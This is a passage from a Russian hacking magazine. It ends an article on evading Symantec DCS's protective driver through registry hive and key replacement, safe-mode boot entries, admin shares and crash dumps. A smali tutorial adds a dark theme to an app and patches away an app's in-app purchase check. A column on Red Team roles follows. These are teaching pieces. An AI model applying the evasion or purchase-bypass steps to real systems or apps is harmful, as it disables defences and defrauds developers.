  заданной. И так далее, вплоть до настройки разрешений для ключей реестра
 и узлов, с которыми допус кается сетевое взаимодей ствие. Гибкость настрой‐
  ки правил разграничения доступа впечатляет! При этом, кстати, под держи‐
 ваются общие наборы пра вил, то есть безопас ник не попадет в трясину нас‐
  тройки правил для каждого экзешника.
    Следует отметить, что перечисленные ограничения не основаны на дес‐
  крипторах безопасности Windows, вмес то этого на уровне драйвера реали‐
  зуется собствен ный механизм разграничения дос тупа.
   В ходе тестирования было установлено, что Symantec DCS успешно
 защищает от прямого чтения данных с диска (попыт ка такого чтения завер‐
 шается с ошибкой), от mimikatz и от некото рых других популярных векторов
  рекогносцировки и распростра нения по сети. Мечта безопасника, казалось
  бы...


 НЕМНОГО О ЗАЩИТНОМ ДРАЙВЕРЕ
  Из‐за PatchGuard поч ти все производители защитных средств опираются
  на официальные способы перехвата функций. Для реестра, например,
  это функции обратного вызова (callbacks), устанавливаемые драй верами
  с помощью функции CmRegisterCallback или CmRegisterCallbackEx.
    Посмотрим на отрывок из официальной документации:
  • Драйверы могут целиком обработать операцию над реестром (или пре‐
    образовать запрошенную операцию в другую опе рацию) и исключить
    обработку  этой  операции  менеджером  конфигурации  (примечание:
    под менеджером конфигура ции понимается компонент ядра операци‐
    онной системы, который отвечает за работу с реестром на низком уров‐
     не).
  • Драйверы могут изменить результат выполнения операции над реестром
    и возвращаемое значение (примеча ние: более под робно это описано
    в соответствующем раз деле).





   Декомпилированный фрагмент фильтру ющей функции для реес тра
    из драйвера Symantec DCS: видно, что в некоторых случаях драй вер
   изменяет возвращаемое значение

 В итоге фильтрующая (перехватывающая) функция получает управление
 до вызова исходной функции ядра операци онной системы и может вернуть
 ошибку без передачи управления этой исходной функции, если, например,
 защитный драйвер решит (на основе анализа аргу ментов функции и данных
 о программе, которая иницииро вала операцию с реестром), что такая опе‐
 рация с реестром дол жна быть запрещена.
    Аналогичный  подход  применя ется  в  отношении файловой  системы
 и сетевого трафика: так, драйвер мини‐филь тра может перехватывать опе‐
 рации с файлами, запрещать или раз решать их, а с помощью фильтрующей
 прослойки (ﬁltering layer) можно раз решать или запрещать сетевые пакеты.
    Для получения более подробной информации рекомендую прой ти по ука‐
  занным ссылкам, все‐таки низкоуровневые аспекты фильтрации не входят
  в тему статьи.


 ТАК ЛИ ПРОСТО ЗАКРЫТЬ БРЕШИ?
 Если  грамотно реализовать фильтры для файловой системы, реес тра
 и сетевых пакетов, то, казалось бы, можно соз дать весьма надежную сис тему,
  изолирующую одну программу от дру гих прог рамм и их данных.
    Конечно, атакующий может загрузить собственный драйвер и из него
  отключить защитные перехваты. А если у атакующего нет воз можнос ти под‐
  писать собственный драйвер (а по умолчанию Windows проверяет электрон‐
 ную подпись у загружаемых драйверов), то можно загрузить чужой подписан‐
 ный драйвер и через уязвимость в нем запустить собственный вредонос ный
  код.
    Для защиты от этого можно, например, блокиро вать загрузку драйверов
 по черному списку, отзы вать подпись от вредонос ных и уяз вимых драйверов.
    Но как быть с атаками из пользовательского режима? Оказывается, что
  часто и здесь не все бреши закрыты.


 УБИ(Р|В)АЕМ ЗАЩИТНЫЙ ДРАЙВЕР ИЗ ПОЛЬЗОВАТЕЛЬСКОГО
 РЕЖИМА
 Основная опасность заключается в том, что нельзя все предусмотреть, —
  настолько широки возможности обхода (нейтра лиза ции) подобных «изолиру‐
 ющих» и «самозащитных» драйверов в Windows.
    Давай уже перейдем к техничес ким деталям!


 Замена куста реестра
 В сос таве Windows API есть две функции: RegSaveKeyEx и RegReplaceKey.
 Первая позволяет экспортировать куст реестра (например, HKLM\System)
  в файл (в бинарном формате), а вторая — заменить весь куст реестра
  на ранее экспортированный файл.
    Трюк заключается в следующем. Мы берем куст HKLM\System, экспортиру‐
 ем его в файл с помощью функции RegSaveKeyEx, затем убираем из этого
 файла записи о защитном драйвере (формат файлов реестра из вестен), пос‐
  ле чего заменяем текущий куст HKLM\System нашим модифицированным.
 После перезагрузки компьютера куст HKLM\System будет содержать наши
 модифицированные данные (то есть записей о защитном драйвере, которые
 мы удалили, в нем не будет).
    Объявление функции RegReplaceKey следующее:


  LSTATUS RegReplaceKeyA(
    HKEY   hKey,
    LPCSTR lpSubKey,
    LPCSTR lpNewFile,
    LPCSTR lpOldFile
  )

 На низком уровне замена куста реес тра экспортированным файлом происхо‐
  дит следующим образом (описание приведено для куста HKLM\System, путь
  к каталогу Windows взят стандартный):
   1. Файл  C:\Windows\System32\config\SYSTEM  переименовы вается
    в lpOldFile.
   2. Файл lpNewFile переименовывается в C:\Windows\System32\con
    fig\SYSTEM.
   3. Операционная система продолжает использовать для куста HKLM\System
    файл lpOldFile вплоть до перезагрузки.
   4. После перезагрузки операционная система начинает использовать файл
    C:\Windows\System32\config\SYSTEM.

 Проблема с защитными средствами заключа ется в том, что многие из них
 не блокируют вызов функции RegReplaceKey. Ата кующий может изме нить
 данные в любом кусте реес тра, который сущес твует в виде файла на дис ке;
  правда, для этого требуется перезагрузка компь ютера.
    Подобный «недостаток» (хотя его можно наз вать и уяз вимостью) был
 обнаружен в защитном решении Symantec DCS, в антивирусах «Лаборатории
 Касперского» и ESET. Ни одна из этих организа ций не признала это за уяз‐
  вимость.
    Windows предоставляет возможность уста новить перехват на замену куста
 реестра. Драйвер, установивший перехват, получает информацию об име ни
 файла, в который будет переименован текущий файл кус та  (lpOldFile),
  а также об имени файла, которым будет заменен текущий куст (lpNewFile).
 Защитный драйвер может проана лизировать файл lpNewFile и решить, сле‐
  дует ли заменять им текущий куст или нет.
   Однако, если присмотреть ся внимательнее, можно заметить, что контроль
 по именам файлов надежным быть не может, пос кольку могут возникать
 ошибки класса TOCTOU (time of check to time of use). Защитный драйвер про‐
  анализирует файл lpNewFile и раз решит исполнение кода для замены куста
 реестра (time of check), но этот код может получить на вход уже совсем дру‐
  гой файл с тем же именем (time of use).
    Таким образом, атакующий может инициировать вызов функции RegRe‐
 placeKey с каким‐то переданным ей на вход именем файла, а в процессе
 работы этой функции (что включает в себя обратный вызов в защитный драй‐
  вер) заменить этот файл дру гим путем переименова ния (новый файл будет
  иметь такое же имя, какое было переда но в функцию RegReplaceKey, но фак‐
  тически это уже другой файл с дру гим содержимым). При определенном сте‐
  чении обстоятельств  это позволит про извести замену файла  как раз
 перед исполнением кода для замены кус та реес тра, но после исполнения
  кода проверки.


 Замена ключа реестра
 В сос таве Windows API есть функция RegRestoreKey. Эта функция чем‐то
  отдаленно похожа на RegSaveKeyEx, толь ко заменяет не куст реестра,
  а отдельный ключ (данные для замены берут ся из экспортированного файла
 реестра, в том же бинарном формате, что назван выше). И не требует
  перезагрузки.
    Объявление функции RegRestoreKey следующее:


  LSTATUS RegRestoreKeyA(
    HKEY   hKey,
    LPCSTR lpFile,
    DWORD  dwFlags
  );

 В качестве аргумента dwFlags можно передать REG_FORCE_RESTORE, что поз‐
  волит заменить ключ реестра даже в том случае, если он или его подключи
 были открыты какой‐либо программой (операции над откры тыми ключами
 после замены будут завершены с ошибкой).
    Если защитный драйвер не проверит и не заблокирует вызов функции Re‐
 gRestoreKey, то можно заменить некото рые важные для работы защитного
 средства ключи реестра. Например, защитное решение Symantec DCS поз‐
  воляет заменить клю чи реестра, отвечающие за запуск сервисов этого
 решения при загрузке компьютера, пус тыми клю чами (то есть замененный
  ключ окажется пустым, без каких‐либо ранее существовавших подключей
 и значений).
    Правда, для отключения сервисов все же требуется перезагрузить компь‐
  ютер. Компания Symantec не признала данный «недос таток» уязвимостью
  (хотя в 2006 году в отно шении другого продукта той же компании аналогич‐
 ный «недостаток» уязвимостью был приз нан).
    Следует отметить, что антивиру сы «Лаборатории Касперского» и ESET
 блокируют подобные операции. То есть не все так плохо.


 Пе резагрузка в безопасный режим
 А еще можно перезагрузить компь ютер в безопасный режим (safe mode), где
 защитные драйверы обычно не  запускаются. Правда, если  атакующий
  получил удаленный доступ к серверу через уязвимый сервис, то этот сервис
  в безопасном режиме вряд ли запустится (и атакующий потеряет свой дос‐
  туп), а значит, атакующему надо как‐то иначе обеспечить исполнение его
  кода в безопасном режиме.
    Один из вариантов — переконфигурировать операционную систему
  на запуск уязвимого сервиса в безопасном режиме (это можно сделать, нап‐
  ример, создав подключи в клю че HKLM\System\ControlSet001\Control\
 SafeBoot\Network). Symantec DCS от такого вектора атаки не защищает.
    Почему бы не защищать от изменений клю чи реестра, отвечающие
  за запуск сервисов в безопасном режиме?


 Работа с защищен ными файлами через общие дирек тории
 Если процесс атакующего не может прочитать какой‐то файл, потому что
  Symantec DCS бло кирует попытки дос тупа, то можно попытаться сде лать то
 же самое через общие директории. Так, если искомый файл находится в рас‐
 шаренной папке, то DCS раз решит дос туп (в том числе и на запись) к этому
 файлу по сетевому пути (например, \\127.0.0.1\c$\block_access_files),
 даже если локальный доступ для данного процесса явно запрещен.
    Конечно, в реальной жизни не ко всем файлам открыт сетевой доступ,
 однако бывают случаи, когда к файлам в какой‐то общей директории нужно
  запретить доступ со стороны процес са (на том же компьютере), которому
  такой доступ не нужен. Например, запретить почтовому серверу работать
  с файлами в общей директории, используемой для обме на файлами в орга‐
  низации, если и поч товый сервер, и общая директория находятся на одном
 компьютере.

 Чте ние защищен ных файлов через краш‑дампы
 Прочитать открытый в дру гом процессе защищенный файл можно и косвенно.
 К примеру, создать дамп памяти это го процес са (нап ример, с помощью ком‐
 понента Task Manager или прог раммы procdump) и искать в нем содержимое
  открытого файла. DCS не блокирует попытки одно го процесса инициировать
  создание дампа памяти другого про цес са.
    На скриншоте ниже — фрагмент дампа памяти Notepad, где открыт файл,
 доступ к которому со сто роны процес са, инициировавшего создание дампа
  памяти, закрыт (а в самом дампе есть содержимое открытого файла).





 ВЫВОДЫ
 Защита от админа в Windows и, в час тности, изоляция программ, работающих
  с правами администра тора, друг от дру га — это не так прос то, как может
  показаться. Даже весьма «взрос лые» продукты вро де Symantec DCS не пре‐
 доставляют полной защиты.
ВЗЛОМ





                                      Михаил Киреев
                                               kireevmp@yandex.ru
  НАЧИНАЕМ
   СО SMALI

            КАК РЕВЕРСИТЬ
           ПРИЛОЖЕНИЯ
           ДЛЯ ANDROID





Обратная разработка позволяет не только разобраться
в существующих приложениях, но и модифицировать их.
В этом смысле приложения на Android — клад для начина‐
ющего хакера и настоящий аттрак цион для любителя. Сегод‐
ня мы разберем несколько приложений, чтобы потрениро‐
ваться в реверс‐инжиниринге и узнать о подлинных воз‐
можностях твоего смартфона.


Какое приложение мы будем препарировать? Я выб рал для своих целей VK
Admin — программу для управления сообщес твами «ВКонтакте» со смартфо‐
на. В нем не предусмотрена темная тема, поэтому мы с тобой попробуем эту
тему добавить.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный изложен ным материалом.



СОБИРАЕМ И РАЗБИРАЕМ
Сначала извлечем все ресурсы приложения, исполь зуя утилиту apktool — она
распаковывает и запаковывает файлы пакетов APK, которые хранятся в сжа‐
том, бинарном виде, и дизассемблирует программный код, заключенный
в них.
   Чтобы получить установочный пакет, можно воспользоваться Android De‐
bugging Bridge — системой для отладки программ на устройстве. В *nix‐
подобных системах ADB ста вится стандартно, с помощью пакетного менед‐
жера, а в Windows — идет в сос таве Android Studio или Android SDK Platform
Tools.
  В первую оче редь установим приложение из Google Play Store на смар‐
тфон, подклю чим его к компь ютеру с помощью USB, затем вос пользуемся
ADB для переноса пакета приложения на компь ютер и извлечем его содер‐
жимое.



  $ adb shell pm path com.vk.admin
  package:/data/app/com.vk.admin‐Ka5KVtTbnGgxoRqnObb‐pQ==/base.apk


  $ adb pull /data/app/com.vk.admin‐Ka5KVtTbnGgxoRqnObb‐pQ==/base.apk com.
  vk.admin.apk
  3881 KB/s (13414132 bytes in 3.374s)


  $ apktool d com.vk.admin.apk
  I: Using Apktool 2.4.0 on base.apk
  I: Loading resource table...
  I: Decoding AndroidManifest.xml with resources...
  I: Regular manifest package...
  I: Decoding file‐resources...
  I: Decoding values / XMLs...
  I: Baksmaling classes.dex...
  I: Copying assets and libs...
  I: Copying unknown files...
  I: Copying original files...


После этого мы получим папку com.vk.admin/, внут ри которой хранится все
содержимое исходного .apk, только в декоди рованном виде. Чтобы при‐
менить изменения, необ ходимо будет сно ва вос пользоваться рядом утилит.
  Сначала собери приложение обратно в пакет .apk.



  $ apktool b com.vk.admin/
  I: Using Apktool 2.4.0
  I: Checking whether resources has changed...
  I: Checking whether sources has changed...
  I: Smaling classes folder into classes.dex...
  I: Building apk file...
  I: Copying unknown files/dir...
  I: Built apk...


Затем необходимо подписать приложение. Это нужно, чтобы и Google Play
Store, и устройство не обновляли приложение, если подписи не совпадают.
Поэтому не забудь удалить приложение с телефона, прежде чем установить
свое, подписанное своим клю чом. Для создания подписи в первый раз нужно
воспользоваться утилитой keytool (входит в Java Development Kit):



  $ keytool ‐genkey ‐keyalg RSA ‐alias xakep ‐keystore ks.keystore ‐valid‐
  ity 10000 ‐keysize 2048
  Enter keystore password:


  Re‐enter new password:
  What is your first and last name?
    [Unknown]:  Xakep User
  What is the two‐letter country code for this unit?
    [Unknown]:  RU
  Is CN=Xakep User, C=RU correct?
    [no]:  yes


  Enter key password for
    (RETURN if same as keystore password):


  Re‐enter new password:


Когда ты уже создал ключ, подпиши приложение.



  $ jarsigner ‐sigalg SHA1withRSA ‐digestalg SHA1 ‐keystore ks.keystore
  com.vk.admin.apk xakep
  Enter Passphrase for keystore:
  jar signed.


После этого установи приложение на телефон.



  $ adb install com.vk.admin.apk
  3881 KB/s (13414132 bytes in 3.374s)
  Success



МЕНЯЕМ ЦВЕТОВЫЕ СХЕМЫ
Цвета в приложении можно настроить нес колькими способами:
 • использовать встроенные цвета, к примеру @android:color/white;
 • создать палитру собс твенных цветов в фай ле colors.xml, которые затем
   используются в виде @color/text_primary;
 • задать цвет шестнад цатеричным кодом, главное — не забывай, что цвета
   в приложении записаны в формате #AARRGGBB — прозрачность на пер‐
  вом месте;
 • воспользоваться парамет рами setTextColor, setBackgroundColor
   внутри кода Java или Kotlin.

Все эти варианты жизнеспособны и постоянно используются.


colors.xml
Цветовая палитра приложения содержится в фай ле com.vk.admin/res/val‐
ues/colors.xml. Структура файла выглядит так:


<?xml version="1.0" encoding="utf‐8"?>
<resources>
    <color name="abc_input_method_navigation_guard">@android:color/
black</color>
    <color name="background_chat">#ffebf0f4</color>
    <color name="background_material_light">@android:color/white</
color>
    ...
    <color name="material_grey_100">#fff5f5f5</color>
    <color name="white">#ffffffff</color>
</resources>

Каждый цвет, который в дальнейшем используется в статичных экранах при‐
ложения, записан здесь. Наша задача — изменить цвета, самый простой спо‐
соб это сделать — инвертировать. Для записи цвета в формате hex можно
отнять из 255 каждый компонент: R, G и B, то есть 255 ‐ R, 255 ‐ G, 255 ‐ B.
Параметры @android:color/white и @android:color/black можно изме‐
нить вручную.


styles.xml
В файле com.vk.admin/res/values/styles.xml заданы цвета, но только
некоторые. Этот файл используется самими раз работчиками, когда они хотят
сделать несколько цветовых схем приложения. Если же этих схем нет,
работать приходится нам с тобой.
  Некоторые цвета текста и фона заданы именно здесь, поэтому их нужно
изменить аналогично с colors.xml.


Layout
В папке com.vk.admin/res/ находят ся опи сания экра нов приложения.
 • com.vk.admin/res/layout/ —  универсальное  хранилище  экранов
   для всех смартфонов. Если нет каких‐то специальных указаний, то будут
   использованы эти ресурсы;
 • com.vk.admin/res/layoutvXX (где XX — версия SDK смартфона,
   зависит от версии Android на устрой стве) используются для работы
   с самыми передовыми элементами UI;
 • остальные com.vk.admin/res/layout... задают специфичные экра‐
  ны приложения для ориента ции устройства, раз решения и так далее.

Некоторые цве та приложения, чаще всего задний фон, можно найти здесь
и изменить.
  Но закончить мы пока не можем — есть экраны, цвет фона и текста
которых задан не в файлах .xml, а пря мо в исполня емом коде приложе ния.
Туда нам и дорога.


SMALI
Внутри приложений на Android используется собс твенный формат файлов —
.dex, или Dalvik EXecutable, и собственная виртуальная машина, чтобы эти
файлы исполнять, — Dalvik.
   Как и с любым компилиру емым языком, для .dex есть байт‐код — smali —
человекочитаемый и понятный с первого взгляда.
  Машина Dalvik, в отличие от JVM, — регис тровая, а не стековая. Регистры
не имеют типов и могут хра нить всё: числа, стро ки, экземпляры классов.
При этом язык smali строго типизирован.
   Вот неболь шая последова тельность инструкций, чтобы вывести содер‐
жимое регистра v0 в лог.
 1. const‐string v1, "MyTag" — записать в регистр v1 строку "MyTag".
 2. invoke‐static  {v0},  Ljava/lang/String;‐>valueOf(I)Ljava/lang/
   String; — вызвать функцию String.valueOf(v0). Здесь static озна‐
   чает, что функция встроена в виртуальную машину; {v0} — спи сок аргу‐
  ментов; L показывает, что сра зу за ним идет наз вание объекта, клас са
   и так далее; java, lang, String; — тип строки; I — тип чис ла, Integer;
   а все вместе (‐>valueOf(I)Ljava/lang/String;) говорит нам о том, что
   вызывается функция valueOf от одного аргумента и воз вращает она стро‐
    ку.
 3. move‐result‐object  v2 — записать результат предыдущей операции
   в v2.
 4. invoke‐static   {v1,   v2},   Landroid/util/Log;‐>d(Ljava/lang/
   String;Ljava/lang/String;)I —   залогировать  содержимое  v2
   под тегом из v1.

Если не удается понять, что значит тот или иной регистр или что делает та
или иная функция, используй декомпилятор smali в Java — Jadx.





               Ин туитивно понятный интерфейс Jadx

Использовать Jadx просто — нужно лишь выбрать файл и открыть его, код
будет автоматически декомпилирован и показан.


        WWW

                     Рекомендую  ознакомиться  с  документацией
                      по байт‐коду Dalvik VM.



setBackgroundColor
Для некоторых экранов приложения используется параметр setBackground‐
Color(I)V, который уста навливает цвет фона. Час то это не статичные экра‐
ны, а динамические: с поддержкой скролла, различные спис ки и карточки.


invoke‐virtual {v1, v0}, Landroid/webkit/WebView;‐>setBackgroundColor
(I)V

Эта строка занимается изменением. Чтобы изменить  цвет, нужно его
записать в регистр, а затем передать в функцию вмес то настоящего.


const v12, ‐0x1000000
### Эквивалент 0xFF000000 — черного


invoke‐virtual {v1, v12}, Landroid/webkit/WebView;‐>setBackgroundCo
lor(I)V

Теперь пройдись по всем файлам и замени цвет.
  Бывают случаи на порядок проще.


const v2, ‐0x1
### Здесь ‐0x1 == 0xFFFFFFFF — белый цвет


invoke‐virtual {v1, v2}, Landroid/support/v7/widget/CardView;‐>setBac
kgroundColor(I)V

Нужно просто изменить ‐0x1 на ‐0x1000000, и приложение погрузится
во тьму.
   Стоит быть внимательным и пытаться разоб рать ся в коде: иногда опти‐
мизатор кода будет перемещать инструкции const вверх, и ты можешь их
не заметить.


setTextColor
Иногда текст, который меняется в ходе работы с приложением, может менять
свой цвет. За это отвечает параметр setTextColor(I)V, второй аргу мент
которого можно подменить на нужный, в нашем случае — белый.


### Меняем цвет
const p1, ‐0x1
### на белый


invoke‐virtual {v0, p1}, Landroid/widget/TextView;‐>setTextColor(I)V

На этом борьбу со светлым фоном и ярким экра ном можно закончить. Боль‐
шинство элементов экра на поменя ли свой цвет на противоположный. Так ты
можешь изме нить любое приложение, осо бенно если ты любишь потыкать
в телефон поздно ночью.





                      Результат изменений


МЕНЯЕМ ФУНКЦИОНАЛЬНОСТЬ ПРИЛОЖЕНИЯ
Чтобы ощутить всю мощь smali, давай попробуем изменить какую‐то часть
приложения. Например, обойдем проверку на внут ренние покупки.
   Возьмем другое приложение — ISS Detector. Оно показы вает положение
МКС над Землей. В нем можно купить расширения: показ комет, планет,
Луны, телескопа «Хаббл».
  При копировании приложения на компьютер может возникнуть проблема:
в составе приложения не один и не два, а целых три файла apk!



  $ adb shell pm path com.runar.issdetector
  package:/data/app/com.runar.issdetector‐dtgy8_hlf1y‐cekrg1_W‐
  A==/base.apk
  package:/data/app/com.runar.issdetector‐dtgy8_hlf1y‐cekrg1_W‐A==/split_‐
  config.en.apk
  package:/data/app/com.runar.issdetector‐dtgy8_hlf1y‐cekrg1_W‐
  A==/split_config.xxhdpi.apk


Копируем все. При переустановке приложения фай лы split_config.en.apk
и split_config.xxhdpi.apk потеряются, а без них приложение будет
вылетать. Поэтому их нужно будет переподписать: зайти в них как в архивы
ZIP, удалить папку META_INF и прогнать через стандартную процедуру утилиты
jarsigner. Основной же файл мы будем препарировать с помощью apktool.
  Покупками в приложении занимается интерфейс IInAppBillingService.
Для  него  прописана  обертка  com.runar.issdetector.util:  IabHelper,
IabResult, Purchase, Security, Inventory.
  В этом приложении мож но не идти напролом, обманывая сервис покупок.
Проще заставить приложение думать, что все уже куплено. В этом нам
поможет Inventory.smali.


             INFO

                   В особо сложных случаях такой трюк провернуть
                      не удается, и тогда приходится подменять дан‐
                        ные, заставляя сервис ложно сообщать о совер‐
                     шенных покупках. Подробнее об этом можно
                        почитать в материале компании Securing Apps
                                   (PDF).


Открыв файл, ты увидишь поле mPurchaseMap<String; Purchase>, которое
содержит в себе все покупки: номер товара, сопос тавленный с покупкой,
которую совершил пользователь.


.field mPurchaseMap:Ljava/util/Map;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Map<",
            "Ljava/lang/String;",
            "Lcom/runar/issdetector/util/Purchase;",
            ">;"
        }
    .end annotation
.end field

Далее в коде мы видим строку hasPurchase(String  sku)  ‐>  boolean,
которая проверяет, совершал ли пользователь покупку. Для этого делается
проверка на существование клю ча sku в mPurchaseMap.


.method public hasPurchase(Ljava/lang/String;)Z
    .locals 1


    .line 45
    iget‐object v0, p0, Lcom/runar/issdetector/util/Inventory;‐>
mPurchaseMap:Ljava/util/Map;


    invoke‐interface {v0, p1}, Ljava/util/Map;‐>containsKey(Ljava/
lang/Object;)Z


    move‐result p1


    return p1
.end method

А что будет, если в любом случае отдавать true?


.method public hasPurchase(Ljava/lang/String;)Z
    .locals 1


    const p1, 0x1


    return p1
.end method

Собираем приложение и уста навлива ем его.



  $ adb install‐multiplie com.runar.issdetector.apk split_config.xxhdpi.
  apk split_config.en.apk
  Success





                    Результат изменения кода

С этого можно начать свой путь в реверс‐инжиниринг. Я рассказал тебе
основы, с которых начинал сам. Небольшие изменения могут улучшить твою
жизнь — надеюсь, я смог тебе это показать.
ВЗЛОМ

  RED TEAM:
 ОРГАНИЗАЦИЯ,
 УПРАВЛЕНИЕ,
    СКОУП
     КОЛОНКА ДЕНИСА МАКРУШИНА





Индустрия информационной безопасности
асимметрична:    атакующий   находится
в более удобном положении, чем спе‐
циалист по защите. Атакованной стороне
нужно  быть  эффектив ной  всегда,  24/7,         Денис Макрушин                                                                                      Специализируется на
а нападающей достаточно быть эффектив‐         разработкеисследованиитехнологийугроз и
ной лишь единожды. Кро ме того, у ата‐       защиты#InspiredByInsecureот целевых атак.
кующего есть воз можность тщательно изу‐          condifesa@gmail.com
чить свою жертву перед активной фазой
атаки,  в  то время  как  другая  сторона
начинает изучение нарушителя уже во вре‐
мя этой атаки.


Именно для того, чтобы сгладить эту асимметрию, индустрия ИБ разделила
процессы на два полюса: обо ронитель ные и нас тупательные. И рас красила
их в разные цвета — красный для атакующей стороны, синий — для защища‐
ющейся.
  В этой статье на примере Red Team я расска жу об основных формальных
и фактических различиях между командами, рассмотрю, с какими задачами
сталкиваются их участники, и, воз можно, даже помогу тебе определиться
с «цветом», если ты только начина ешь свою карьеру в информационной
безопасности или чувствуешь себя не на том мес те.


КРАСНАЯ, СИНЯЯ И ПУРПУРНАЯ КОМАНДЫ
Понятия Red Team и Blue Team пришли из тра дици онного военного ремесла,
и суть этих терминов нисколько не изменилась. Blue Team в контексте кибер‐
безопасности означает команду экспертов, задача которых — обеспечивать
защиту инфраструктуры.





  Ключевые этапы адаптивной безопасности, которые дол жны быть выс‐
  троены Blue Team (источник — Gartner)

Согласно  архитек туре  адаптивной  безопасности,  которую  пред ложило
информационное агентство Gartner, задачи Blue Team делятся на следующие
области:
 • Prevent — выстраивать систему защиты от уже известных атак;
 • Detect — выявлять новые (в том числе и ранее неизвестные) атаки и опе‐
   ративно приоритизировать и обрабатывать инциденты;
 • Respond — вырабатывать ответные меры и политики реагирования
   на выявленные инциденты (на этом эта пе крайне желательно, чтобы выяв‐
   ленные инциденты целой категорией отправлялись в блок Prevent);
 • Predict — прогнозиро вать появление новых атак с учетом меняющегося
   ландшафта угроз.

Последний пункт с технической точки зрения и привносит нас тоящий чел‐
лендж в работу security‐ана литика («Какое там прогнозирование, когда SIEM
завален событиями и инциденты еще не разоб раны?»). К этому блоку отно‐
сятся мероприятия для оценки уровня защищенности, однако они же поз‐
воляют оценить эффективность процессов и на других стадиях.
   Таким обра зом, задача Red Team сводится не к тому, чтобы «раз нести»
корпоративную инфраструктуру и доказать всем, что все плохо; а напротив —
использовать  анализ защищенности  в  качес тве  конструктивной меры
для оценки существующих процес сов и помощи Blue Team в их улучшении.
  Во многих организациях, где процес сы ИБ еще недос таточно зрелые либо
бюджеты не позволяют расширять штат безопас ников, задачи оценки
защищенности решают специалисты Blue Team. А вот в крупных компани ях
наступательные мероприятия передали Red Team. Это разделение, в час‐
тности, позволяет бизнесу эффективно оценивать бюджеты на информацион‐
ную безопасность.
  Изредка встречаются крупные компании, которые добавляют еще и коман‐
ду Purple Team. Ее основная задача — в повышении эффективности взаимо‐
действия синей и красной команд. «Пурпурные» эксперты помогают дру гим
командам дружить, позволяя синей команде разрабаты вать стратегию и тех‐
нические меры для защиты инфраструктуры на основе обнаруженных крас ной
командой уязвимостей и недос татков. Однако при наличии эффективной ком‐
муникации между Blue Team и Red Team необ ходимость в Purple Team
вызывает сомнения.
  Еще раз подчеркну. Цель всех  этих команд — повышение уровня
защищенности инфраструктуры. При этом:
 • Blue Team занята защитой инфраструктуры за счет реализации процес сов
   адаптивной безопасности;
 • Red Team занимается эму ляцией действий атакующего, а также выраба‐
   тывает и реализует стра тегии для оценки эффективности процессов
   защиты и непрерывно дос тавляет результаты команде Blue Team;
 • Purple Team, если она есть, выраба тыва ет эффективные меры для Blue
  Team с учетом экспертизы Red Team.

Выбирай свою пилюлю, исходя из личных интересов, но помни, что Red Team
не означает «игры в хакеров» и какую‐либо романтику. Более того, на мой
взгляд, в задачах Blue Team куда больше реаль ных вызовов, потому что
экспертам этой команды,  в отличие  от Red Team, надо быть  начеку
в режиме 24/7.





   Выбери свою пилюлю, Нео, но помни, что результат должен быть один


ВИДЫ НАСТУПАТЕЛЬНОЙ БЕЗОПАСНОСТИ
Разобравшись с высоко уровневыми целями команд, представляем себе, что
выбрали красную пилюлю. Рассмотрим задачи Red Team в контексте всех
мероприятий, связанных с наступательной безопасностью.





Хайп вокруг услуг Red Teaming, который одно время наб людал ся в индустрии,
постепенно проходит. Считалось, что крас ные команды якобы намного
эффективнее и дороже пентестов, а их работа сложнее. Не ведись! Эти про‐
цессы преследуют разные цели в рамках одной общей задачи — повыше ния
уровня защищен ности. Они решают раз ные технические задачи и, соответс‐
твенно, не взаимозаменяемы. Напротив, эти активности должны на опре‐
деленных этапах допол нять друг дру га.
  Существует много видов процессов наступательной безопасности, и у
каждого свои задачи. Здесь и Vulnerability Assessment, и Penetration Testing,
и Red Teaming. Чаще всего их отличия заключа ются в скоупе, глубине прод‐
вижения в процессе ана лиза защищен ности и показателях, которые будут
использоваться Blue Team для выработки защитных мер.





  Виды наступательных мероприятий и их скоуп (источник — Threatexpress)

Vulnerability Assessment проводится для оценки поверхнос ти атаки и зачастую
неплохо выполняется внутренними подразделениями (in‐house), например
силами Blue Team. В качес тве примера категории таких работ можно привес‐
ти инструментальное ска нирование на уяз вимости с последу ющей ручной
верификацией обнаруженных проблем.
  При этом для точ ной оценки рисков информации об уяз вимостях оказыва‐
ется недостаточно, так как большое значение имеет контекст, в которых эти
уязвимости находятся. Например, уязвимость на рабочей станции сотрудника
HR‐департамента может привести к утечке нескольких файлов с зарплатами
сотрудников, в то время как эта же уяз вимость на рабочей станции рядового
системного администра тора может привести к компрометации доменного
контроллера, с последу ющей установкой бэкдоров и возможностью неп‐
рерывной кражи важной для биз неса информации.


Воп росы, на которые дает отве ты Vulnerability Assessment
 • Какие уязвимости и в каком количес тве содержит моя инфраструктура?
 • Что требует немедленного исправления (какой при оритет у обнаруженных
   проблем)?



Penetration Testing часто идет сра зу пос ле успешно внедренного процес са VA
и может вклю чать его в себя как часть работ. Поверхность атаки, полученная
на предыдущем этапе, используется для выявления и проверки воз можных
сценариев. Соответственно, эта информация исполь зуется для более точной
оценки бизнес‐рисков.
  В большинстве случаев на практике пентесты используются для анализа
защищенности технической инфраструктуры и реже — для оценки организа‐
ционных процессов (так называемые соци отехнические тесты). Как правило,
этот тип проверок ограничен во времени (ежеквартальные пентесты для com‐
pliance, пентесты перед аудитами и подоб ное) и раз работан для реализации
конкретной задачи — это могут быть закрепление в корпоративной сети, кра‐
жа определенной информации, компромета ция конкретных сотрудников и так
далее. В результате пентест демонс трирует конкрет ные проблемы, которые
могут и не дать общей картины эффективности про цессов ИБ в компании.


Воп росы, на которые дает отве ты Penetration Testing
 • Возможен ли доступ к моей инфраструктуре (моим данным)? Если да, то
   каким способом?
 • Насколько эффективно спра вится с проверкой моя служба ИБ?
 • Готов ли я к комплексному аудиту ИБ?



При проведении пентеста бизнесу важно понимать, насколько процес сы
защиты эффективны в данный момент и насколько хороши те или иные
защитные меры. Но поскольку пентесты ограничены и во времени, и по ско‐
упу, они не позволя ют получить полную картину.
  Red Teaming же — это непрерывный про цесс симуляции атак с целью
оценки всех существующих про цес сов защиты организации и повыше ния
осведомленности задействованных в этом про цес се лиц. Это определе ние
звучит академически, но зато исчерпывающе.
   Красная команда свободна в выборе тактик, техник и процедур (tactics,
techniques, and procedures, час то сокращают как TTP) для реализации своих
целей.
  Можешь посмотреть небольшой документальный фильм издания Tech In‐
sider о Red Team, чтобы понять, как выглядит рабочий процесс эксперта крас‐
ной команды.





Воп росы, на которые дает ответ Red Teaming
 • Насколько эффективны существу ющие защитные меры, включая VA и пен‐
   тесты?
